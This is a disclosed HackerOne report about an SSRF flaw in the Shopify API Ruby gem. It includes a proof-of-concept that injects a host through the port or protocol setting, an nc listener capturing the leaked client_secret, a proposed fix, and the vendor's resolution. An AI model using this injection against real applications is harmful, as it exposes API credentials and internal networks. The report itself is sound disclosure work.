{"id":423437,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjM0Mzc=","url":"https://hackerone.com/reports/423437","title":"H1514 Shopify API ruby SDK session setup lacks input validation, resulting in SSRF and leakage of client secret","state":"Closed","substate":"resolved","severity_rating":"none","readable_substate":"Resolved","created_at":"2018-10-13T18:08:20.646Z","submitted_at":"2018-10-13T18:08:20.646Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jobert","url":"/jobert","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-04-05T13:44:34.501Z","bug_reporter_agreed_on_going_public_at":"2019-04-04T21:47:26.715Z","team_member_agreed_on_going_public_at":"2019-04-05T13:44:34.351Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi team,\n\nThe [Shopify API ruby SDK](https://github.com/shopify/shopify_api) has the ability for the developer to interact with their shop's REST API. When setting up the gem, a code structure similar to the one below may be used to set up the connection:\n\n```ruby\nrequire 'shopify_api'\n\nclass SomeController \u003c ApplicationController\n  def index\n    ShopifyAPI::Session.setup secret: '\u003csecret\u003e'\n\n    session = ShopifyAPI::Session.new('some-shop.myshopify.com')\n\n    access_token = session.request_token(params)\n  end\nend\n```\n\nWhen the `ShopifyAPI::Session` class is initialized, the following code is executed:\n\n```ruby\ndef prepare_url(url)\n  return nil if url.blank?\n  # remove http:// or https://\n  url = url.strip.gsub(/\\Ahttps?:\\/\\//, '')\n  # extract host, removing any username, password or path\n  shop = URI.parse(\"https://#{url}\").host\n  # extract subdomain of .myshopify.com\n  if idx = shop.index(\".\")\n    shop = shop.slice(0, idx)\n  end\n  return nil if shop.empty?\n  shop = \"#{shop}.#{myshopify_domain}\"\n  port ? \"#{shop}:#{port}\" : shop\nrescue URI::InvalidURIError\n  nil\nend\n```\n\nAt the bottom, right above the `rescue` keyword, it can be observed that if a port is given, it is appended to the shop URL. This means that if the `setup` method is invoked with a `port` parameter, it'll be appended after the parsed hostname. Here is an example:\n\n```\n[1] pry(main)\u003e require 'shopify_api'\n=\u003e true\n[2] pry(main)\u003e ShopifyAPI::Session.setup port: '80', secret: ''\n=\u003e {:port=\u003e\"80\", :secret=\u003e\"\"}\n[3] pry(main)\u003e session = ShopifyAPI::Session.new(\"test.myshopify.com\")\n=\u003e #\u003cShopifyAPI::Session:0x00007fc5b2051070 extra={}, token=nil, url=\"test.myshopify.com:80\"\u003e\n```\n\nAs can be seen above, the resulting instance variable called `url` now contains the given `port` value. When the `request_token` method is called, the following code gets executed:\n\n```ruby\ndef access_token_request(code)\n  uri = URI.parse(\"#{protocol}://#{url}/admin/oauth/access_token\")\n  https = Net::HTTP.new(uri.host, uri.port)\n  https.use_ssl = true\n  request = Net::HTTP::Post.new(uri.request_uri)\n  request.set_form_data({\"client_id\" =\u003e api_key, \"client_secret\" =\u003e secret, \"code\" =\u003e code})\n  https.request(request)\nend\n```\n\nThe problem that arises here, is that the URL gets parsed a second time and then uses the parsed information from the newly constructed URL instead of what the class was initialized with. This allows an attacker to inject an arbitrary domain through the `port` and `protocol` parameter when calling the `setup` method. An example:\n\n```ruby\nrequire 'shopify_api'\n\nShopifyAPI::Session.setup protocol: 'https', secret: '', port: '@127.0.0.1/?'\n\nsession = ShopifyAPI::Session.new('some-shop.myshopify.com')\n\naccess_token = session.request_token({'hmac' =\u003e 'd54d830d05601f0b4247f654e4c57b51318be655f40c7a7119141c98a23f6815', 'timestamp': '2000000000'})\n```\n\nThe code above will exfiltrate the `client_secret`, `client_id`, and `code` to `127.0.0.1:443`. An excerpt of the captured request can be found below. The `hmac` above is a valid signature for the given timestamp (in a far distant future) and an empty secret.\n\n```\n$ nc -l -n -vv -p 443\nListening on [0.0.0.0] (family 0, port 443)\nConnection from [127.0.0.1] port 443 [tcp/*] accepted (family 2, sport 60286)\nPOST /?/admin/oauth/access_token HTTP/1.1\nHost: 127.0.0.1:443\nConnection: Keep-Alive\nAccept-Encoding: gzip\nContent-Length: 29\nAccept: */*\nUser-Agent: Ruby\nContent-Type: application/x-www-form-urlencoded\n\nclient_id\u0026client_secret=\u0026code\n```\n\nThe same can be achieved with the `protocol` parameter:\n\n```ruby\nShopifyAPI::Session.setup protocol: 'https://127.0.0.1/?', secret: ''\n\nsession = ShopifyAPI::Session.new('some-shop.myshopify.com')\n\naccess_token = session.request_token({'hmac' =\u003e 'd54d830d05601f0b4247f654e4c57b51318be655f40c7a7119141c98a23f6815', 'timestamp': '2000000000'})\n```\n\n## Impact\n\nThis vulnerability can only be exploited if an attacker can influence the `port` or `protocol` parameter when given to the `setup` method. This seems to be rather unlikely to happen. However, I don't believe that the usage of a Gem should unnecessarily expose the user to arbitrary security vulnerabilities. Given that this may impact their local network and may leak their API keys, I decided to bring this to your attention.\n\nHere's what a fix could look like:\n\n```diff\ndiff --git a/lib/shopify_api/session.rb b/lib/shopify_api/session.rb\nindex 937bbd0..bd8fdaf 100644\n--- a/lib/shopify_api/session.rb\n+++ b/lib/shopify_api/session.rb\n@@ -16,7 +16,18 @@ module ShopifyAPI\n     class \u003c\u003c self\n\n       def setup(params)\n-        params.each { |k,value| public_send(\"#{k}=\", value) }\n+        params.each do |key, value|\n+          case key\n+          when 'port', :port\n+            sanitized_value = value.to_i\n+          when 'protocol', :protocol\n+            sanitized_value = protocol =~ /\\Ahttps?\\Z/ ? protocol : 'https'\n+          else\n+            sanitized_value = value\n+          end\n+\n+          public_send(\"#{key}=\", sanitized_value)\n+        end\n       end\n\n       def temp(domain, token, \u0026block)\n```","weakness":{"id":107,"name":"Improper Input Validation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":11,"voters":["drsniper","mik317","eveeez","khalidamin","cr4xerbik4sh","cryptographer","sinswriter","reddmist","mysteriousm","wizfuzz","and 1 more..."],"severity":{"rating":"none","author_type":"Team"},"structured_scope":{"databaseId":10803,"asset_type":"OTHER","asset_identifier":"Other","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3494458,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report.\n\nAs far as I can tell, the `protocol` and `port` properties were only added for local testing at Shopify, and they should no longer be needed. So I've opened a pull request to remove them: https://github.com/Shopify/shopify_api/pull/479\n\nWe believe it would be very unlikely for those properties to be set based on untrusted input, so we've decided that this report is not eligible for a bounty.","automated_response":false,"created_at":"2018-10-17T18:28:26.348Z","updated_at":"2018-10-17T18:28:26.348Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3494527,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","automated_response":false,"created_at":"2018-10-17T18:37:49.916Z","updated_at":"2018-10-17T18:37:49.916Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3496310,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e We believe it would be very unlikely for those properties to be set based on untrusted input, so we've decided that this report is not eligible for a bounty.\n\nI'm sure you're right! In case it wasn't 100% clear yet, the only reason why I reported this, is that I think it is not a good idea to expose developers and organizations to these risks when leveraging the Ruby SDK, even though the changes are small. I'd expect more thoroughness on properly deprecating unused properties. If this were to only be used in local / test environments, I'd suggest you'd wrap these properties into a conditional so that they can only be used in those environments. This would prevent developers unexpectedly make their system vulnerable to problems by thinking they're doing the right thing. Thanks (again) for getting back to me, it's appreciated.","automated_response":false,"created_at":"2018-10-18T04:39:36.601Z","updated_at":"2018-10-18T04:39:36.601Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4301466,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"The `protocol` and `port` options were removed in the recent 6.0.0 release of the shopify_api gem, so we're closing off this report.\n\nThanks again for your report, and we look forward to receiving more reports from you soon!","automated_response":false,"created_at":"2019-03-11T16:27:00.948Z","updated_at":"2019-03-11T16:27:00.948Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jobert","url":"/jobert"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4481451,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-04T21:47:26.746Z","updated_at":"2019-04-04T21:47:26.746Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4490715,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-05T13:44:34.412Z","updated_at":"2019-04-05T13:44:34.412Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4490716,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-04-05T13:44:34.529Z","updated_at":"2019-04-05T13:44:34.529Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7146733,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2020-02-25T14:34:57.505Z","updated_at":"2020-02-25T14:34:57.505Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"None","new_scope":"Other","genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}